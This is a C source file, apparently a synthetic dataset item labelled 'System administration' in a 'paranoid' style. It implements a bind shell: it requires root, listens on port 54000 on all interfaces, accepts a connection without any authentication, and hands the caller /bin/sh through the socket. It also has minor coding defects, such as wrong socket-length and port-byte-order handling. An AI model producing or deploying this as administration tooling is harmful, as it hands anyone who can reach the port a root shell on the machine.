//MISTRAL-7B DATASET v1.0 Category: System administration ; Style: paranoid
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <err.h>
#include <errno.h>

#define PARANOID_MODE 1

void die(const char *msg) {
    if (PARANOID_MODE) {
        char err_msg[1024];
        strerror_r(errno, err_msg, sizeof(err_msg));
        fprintf(stderr, "%s: %s\n", msg, err_msg);
        exit(EXIT_FAILURE);
    }
    perror(msg);
    exit(EXIT_FAILURE);
}

void check_root() {
    if (geteuid() != 0) {
        fprintf(stderr, "This program must be run as root.\n");
        exit(EXIT_FAILURE);
    }
}

int main() {
    check_root();

    int sockfd, newsockfd, portno, clilen;
    struct sockaddr_in serv_addr, cli_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) die("ERROR opening socket");

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(54000);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
        die("ERROR on binding");

    listen(sockfd, 5);

    printf("Waiting for incoming connections...\n");

    clilen = sizeof(cli_addr);
    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
    if (newsockfd < 0) die("ERROR on accept");

    printf("Connection from %s:%d accepted.\n",
           inet_ntoa(cli_addr.sin_addr), cli_addr.sin_port);

    int fd = open("/dev/null", O_RDWR);
    if (fd < 0) die("Could not open /dev/null");

    dup2(newsockfd, STDIN_FILENO);
    dup2(newsockfd, STDOUT_FILENO);
    dup2(newsockfd, STDERR_FILENO);

    close(sockfd);

    execl("/bin/sh", "sh", NULL);
    perror("Error executing shell");

    close(newsockfd);
    close(fd);
    exit(EXIT_FAILURE);
}